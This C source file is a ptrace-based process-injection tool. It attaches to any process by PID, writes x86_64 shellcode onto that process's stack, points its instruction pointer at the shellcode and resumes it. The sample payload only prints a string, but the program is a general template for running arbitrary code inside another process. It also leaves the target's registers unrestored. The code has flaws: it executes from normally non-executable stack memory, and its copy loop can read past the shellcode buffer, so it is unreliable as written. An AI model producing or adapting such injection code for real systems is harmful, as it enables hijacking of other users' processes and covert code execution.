#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <errno.h>

void die(const char *msg) {
    perror(msg);
    exit(1);
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
        return 1;
    }

    pid_t pid = atoi(argv[1]);
    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) == -1)
        die("PTRACE_ATTACH");

    waitpid(pid, NULL, 0);
    printf("[+] Attached to process %d\n", pid);

    struct user_regs_struct regs;
    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) == -1)
        die("GETREGS");

    printf("[+] Original RIP: 0x%llx\n", regs.rip);

    // We'll inject some x86_64 shellcode that writes to stdout
    // write(1, "Injected!\n", 9)
    unsigned char shellcode[] = {
        0x48, 0x31, 0xc0,                         // xor rax, rax
        0x48, 0x89, 0xc2,                         // mov rdx, rax
        0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, // mov rax, 1 (sys_write)
        0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00, // mov rdi, 1 (stdout)
        0x48, 0x8d, 0x35, 0x0a, 0x00, 0x00, 0x00, // lea rsi, [rip+0xa]
        0x48, 0xc7, 0xc2, 0x09, 0x00, 0x00, 0x00, // mov rdx, 9
        0x0f, 0x05,                               // syscall
        0xcc,                                     // int3 (trap)
        'I','n','j','e','c','t','e','d','\n'
    };

    size_t len = sizeof(shellcode);
    unsigned long long inject_addr = regs.rsp - 0x200; // leave some stack headroom

    for (size_t i = 0; i < len; i += sizeof(long)) {
        long chunk = 0;
        memcpy(&chunk, shellcode + i, sizeof(long));
        ptrace(PTRACE_POKEDATA, pid, inject_addr + i, chunk);
    }

    regs.rip = inject_addr;
    if (ptrace(PTRACE_SETREGS, pid, NULL, &regs) == -1)
        die("SETREGS");

    printf("[+] RIP redirected to shellcode\n");
    ptrace(PTRACE_CONT, pid, NULL, NULL);

    waitpid(pid, NULL, 0);  // wait for int3
    printf("[+] Shellcode ran. We out.\n");

    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return 0;
}

